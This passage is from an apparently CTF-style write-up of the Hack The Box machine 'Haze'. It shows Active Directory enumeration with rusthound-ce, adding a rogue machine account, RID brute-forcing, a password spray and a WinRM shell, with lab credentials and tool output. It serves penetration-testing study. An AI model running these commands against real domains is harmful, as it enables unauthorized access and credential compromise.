[2025-06-24T15:06:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:06:44Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=haze,DC=htb
[2025-06-24T15:06:44Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:06:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=haze,DC=htb
[2025-06-24T15:06:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:06:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=haze,DC=htb
[2025-06-24T15:06:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:06:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=haze,DC=htb
[2025-06-24T15:06:47Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:06:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=haze,DC=htb
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::parser] Starting the LDAP objects parsing...
[2025-06-24T15:06:47Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 14%                                                                                                            
[2025-06-24T15:06:47Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::parser] Parsing LDAP objects finished!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 3 users parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 40 groups parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-06-24T15:06:47Z INFO  rusthound_ce::json::maker::common] .//20250624150647_haze-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 15:06:47 on 06/24/25! Happy Graphing!

```

In general, this is better supported than the Python collector. I’ll upload the resulting archive to my local Bloodhound Docker and mark paul.taylor as owned.

Paul has outbound control to Enroll in some certificates:

![image-20250624111856433](/img/image-20250624111856433.png)

This isn’t that interesting, other than that the group that paul.taylor is a member is doesn’t have a name. It’s likely the Domain Users group, but it’s odd that the name doesn’t resolve.

Looking at the raw `users.json` file, it’s clear that the data set is not complete:

```

oxdf@hacky$ cat 20250624150647_haze-htb_users.json | jq -r '.data[].Properties.name'
PAUL.TAYLOR@HAZE.HTB
HAZE-IT-BACKUP$@HAZE.HTB
NT AUTHORITY@HAZE.HTB

```

Something is weird with paul.taylor’s permissions.

### Alternative User Enum

The intended route is use the RID brute force to get the user list, and then password spray (the next step) using that list. Ippsec found a neat alternative:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[<a href='#validate'>Auth as paul.taylor</a>]-->G(<a href='#smb-user-enum'>RID brute</a>)
    G-->B(<a href='#password-spray'>Password spray</a>);
    B-->C[<a href='#shell'>Shell as mark.adams</a>];
    C-->D(<a href='#enumeration-1'>Full user enum /\nBloodhound</a>);
    A-->E(<a href='#alternative-user-enum'>Add computer</a>);
    E-->F(Early user full enum /\nBloodhound);
    F-->B;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,6,7,8 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

The machine account quota is the default value of 10:

```

oxdf@hacky$ netexec ldap haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' -M maq
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
MAQ         10.10.11.61     389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.11.61     389    DC01             MachineAccountQuota: 10

```

That means that each user can add up to 10 machines to the domain. I’ll do that:

```

oxdf@hacky$ addcomputer.py -computer-name '0xdf$' -computer-pass '0xdf0xdf!' -dc-host haze.htb -domain-netbios haze 'haze/paul.taylor:Ld@p_Auth_Sp1unk@2k24'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account 0xdf$ with password 0xdf0xdf!.

```

That account and authenticate:

```

oxdf@hacky$ netexec smb haze.htb -u '0xdf$' -p '0xdf0xdf!' 
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\0xdf$:0xdf0xdf! 

```

And list all the users:

```

oxdf@hacky$ netexec smb haze.htb -u '0xdf$' -p '0xdf0xdf!' --users
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\0xdf$:0xdf0xdf! 
SMB         10.10.11.61     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-            
SMB         10.10.11.61     445    DC01             Administrator                 2025-03-20 21:34:49 0       Built-in account for administering the computer/domain
SMB         10.10.11.61     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.61     445    DC01             krbtgt                        2025-03-05 07:09:15 0       Key Distribution Center Service Account
SMB         10.10.11.61     445    DC01             paul.taylor                   2025-06-26 05:35:27 0        
SMB         10.10.11.61     445    DC01             mark.adams                    2025-06-26 05:35:27 0        
SMB         10.10.11.61     445    DC01             edward.martin                 2025-06-26 05:35:27 0        
SMB         10.10.11.61     445    DC01             alexander.green               2025-06-26 05:35:27 0        
SMB         10.10.11.61     445    DC01             [*] Enumerated 7 local users: HAZE

```

I can also do a full Bloodhound collection. Regardless, I’ll still have to do a password spray next.

### Password Spray

I’ll use the RID bruteforce to make a list of usernames on the domain:

```

oxdf@hacky$ netexec smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee domain_users
Administrator
Guest
krbtgt
DC01$
paul.taylor
mark.adams
edward.martin
alexander.green
Haze-IT-Backup$

```

I’ll save the three passwords I have so far in a file as well, and spray these across all the usernames:

```

oxdf@hacky$ netexec smb haze.htb -u domain_users -p passwords --continue-on-success 
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Administrator:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Guest:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\krbtgt:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\DC01$:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:changeme STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Administrator:password STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Guest:password STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\krbtgt:password STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\DC01$:password STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:password STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:password STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:password STATUS_LOGON_FAILURE 

```

mark.adams shares the same password as paul.taylor!

### Shell

mark.adams can also WinRM:

```

oxdf@hacky$ netexec winrm haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) 
WINRM       10.10.11.61     5985   DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)

```

I’ll connect with [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py):

```

oxdf@hacky$ evil-winrm-py -i haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.1
[*] Connecting to haze.htb:5985 as mark.adams
evil-winrm-py PS C:\Users\mark.adams\Documents>

```

## Auth as Haze-IT-Backup

### Enumeration

#### Filesystem

mark.adams’ home directory is very empty.

```

evil-winrm-py PS C:\Users\mark.adams> tree /f .
Folder PATH listing
Volume serial number is 0000025F 3985:943C
C:\USERS\MARK.ADAMS
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos

```

There are two other non-administrator users with home directories:

```

evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/4/2025  11:29 PM                Administrator
d-----          3/4/2025  11:46 PM                alexander.green
d-----          3/5/2025   5:49 PM                edward.martin
d-----         6/24/2025   4:31 PM                mark.adams
d-r---          3/4/2025  11:00 PM                Public    

```

mark.adams doesn’t have access to any of them.

There’s an interesting folder, `Backups` at the root of `C:`:

```

evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2025  12:32 AM                Backups
d-----         3/25/2025   2:06 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          3/4/2025  11:28 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         6/24/2025   4:31 PM                Users
d-----         3/25/2025   2:15 PM                Windows   

```

mark.adams can enter but not list:

```

evil-winrm-py PS C:\> cd Backups
evil-winrm-py PS C:\Backups> ls
Access to the path 'C:\Backups' is denied.

```

#### Bloodhound

mark.adams can list all the users on the domain:

```

oxdf@hacky$ netexec smb haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --users
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-            
SMB         10.10.11.61     445    DC01             Administrator                 2025-03-20 21:34:49 0       Built-in account for administering the computer/domain
SMB         10.10.11.61     445    DC01             Guest                         <never>             4       Built-in account for guest access to the computer/domain
SMB         10.10.11.61     445    DC01             krbtgt                        2025-03-05 07:09:15 4       Key Distribution Center Service Account
SMB         10.10.11.61     445    DC01             paul.taylor                   2025-06-24 04:42:30 0        
SMB         10.10.11.61     445    DC01             mark.adams                    2025-06-24 04:42:30 0        
SMB         10.10.11.61     445    DC01             alexander.green               2025-06-24 04:42:30 3        
SMB         10.10.11.61     445    DC01             [*] Enumerated 6 local users: HAZE

```

I’ll collect Bloodhound again:

```

oxdf@hacky$ rusthound-ce --domain haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 -c All --zip
---------------------------------------------------
Initializing RustHound-CE at 15:36:13 on 06/24/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-06-24T15:36:13Z INFO  rusthound_ce] Verbosity level: Info
[2025-06-24T15:36:13Z INFO  rusthound_ce] Collection method: All
[2025-06-24T15:36:14Z INFO  rusthound_ce::ldap] Connected to HAZE.HTB Active Directory!
[2025-06-24T15:36:14Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-06-24T15:36:14Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:36:14Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=haze,DC=htb
[2025-06-24T15:36:14Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:36:16Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=haze,DC=htb
[2025-06-24T15:36:16Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:36:17Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=haze,DC=htb
[2025-06-24T15:36:17Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:36:17Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=haze,DC=htb
[2025-06-24T15:36:17Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-06-24T15:36:17Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=haze,DC=htb
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::parser] Starting the LDAP objects parsing...
[2025-06-24T15:36:17Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 4%                                                                                                             [2025-06-24T15:36:17Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::parser] Parsing LDAP objects finished!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 8 users parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-06-24T15:36:17Z INFO  rusthound_ce::json::maker::common] .//20250624153617_haze-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 15:36:17 on 06/24/25! Happy Graphing!

```

With the new data uploaded, the unknown group is Domain Users:

![image-20250624114146278](/img/image-20250624114146278.png)

Still nothing else interesting for paul.taylor. I’ll mark mark.adams as owned, and look at their outbound control, but it shows the same:

![image-20250624114832838](/img/image-20250624114832838.png)

I’ll look at mark.adams’ groups, and there are more than paul.taylor:

![image-20250624114909855](/img/image-20250624114909855.png)

Remote Management Users isn’t surprising, as it’s how mark.adams is able to connect with WinRM. gMSA\_Managers is interesting. It’s a non-standard group. Bloodhound isn’t showing it having any permissions.

#### gMSA Enumeration

Bloodhound isn’t showing anything, but this group name has to mean something. gMSA (group managed service accounts) are accounts that have crazy strong passwords managed by the domain that are retrievable by given users.

I’ll start by looking for service accounts:

```

evil-winrm-py PS C:\> Get-ADServiceAccount -Filter *

DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled           : True
Name              : Haze-IT-Backup
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780
SamAccountName    : Haze-IT-Backup$
SID               : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName : 

```

There’s one. The `ObjectClass` says it’s a gMSA account. I’ll look at what users can read the password:

```

evil-winrm-py PS C:\> Get-ADServiceAccount Haze-IT-Backup -Property PrincipalsAllowedToRetrieveManagedPassword

DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          : 

```

It shows only Domain Admins group.

I’ll take a closer look at the ACLs for Haze-IT-Backup$:

```

evil-winrm-py PS C:\> $backupuser = Get-ADServiceAccount Haze-IT-Backup
evil-winrm-py PS C:\> (Get-Acl "AD:\$($backupuser.DistinguishedName)").Access

ActiveDirectoryRights : ExtendedRight
InheritanceType       : None
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Deny
IdentityReference     : Everyone
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : All
ObjectType            : 0e78295a-c6d3-0a40-b491-d62251ffa0a6
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Deny
IdentityReference     : HAZE\paul.taylor
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : All
ObjectType            : e362ed86-b728-0842-b27d-2dea7a9df218
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Deny
IdentityReference     : HAZE\paul.taylor
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : All
ObjectType            : f8758ef7-ac76-8843-a2ee-a26b4dcaf409
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Deny
IdentityReference     : HAZE\paul.taylor
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : All
ObjectType            : d0d62131-2d4a-d04f-99d9-1c63646229a4
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Deny
IdentityReference     : HAZE\paul.taylor
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericRead
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : BUILTIN\Account Operators
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HAZE\Domain Admins
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, GenericExecute
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HAZE\gMSA_Managers
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : None
ObjectType            : e362ed86-b728-0842-b27d-2dea7a9df218
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : Everyone
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : None
ObjectType            : 77b5b886-944a-11d1-aebd-0000f80367c1
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : Self
InheritanceType       : None
ObjectType            : f3a64788-5306-11d1-a9c5-0000f80367c1
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : Self
InheritanceType       : None
ObjectType            : 72e39547-7b18-11d1-adef-00c04fd8d5cd
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : None
ObjectType            : 46a9b11d-60ae-405a-b7e8-ff8a58d456d2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Windows Authorization Access Group
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : None
ObjectType            : bf967a7f-0de6-11d0-a285-00aa003049e2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : HAZE\Cert Publishers
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : WriteProperty
InheritanceType       : None
ObjectType            : 888eedd6-ce04-df40-b462-b8a50e41ba38
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : HAZE\gMSA_Managers
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 5f202010-79a5-11d0-9020-00c04fc2d4cf
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 5f202010-79a5-11d0-9020-00c04fc2d4cf
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 037088f8-0ae1-11d2-b422-00a0c968f939
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
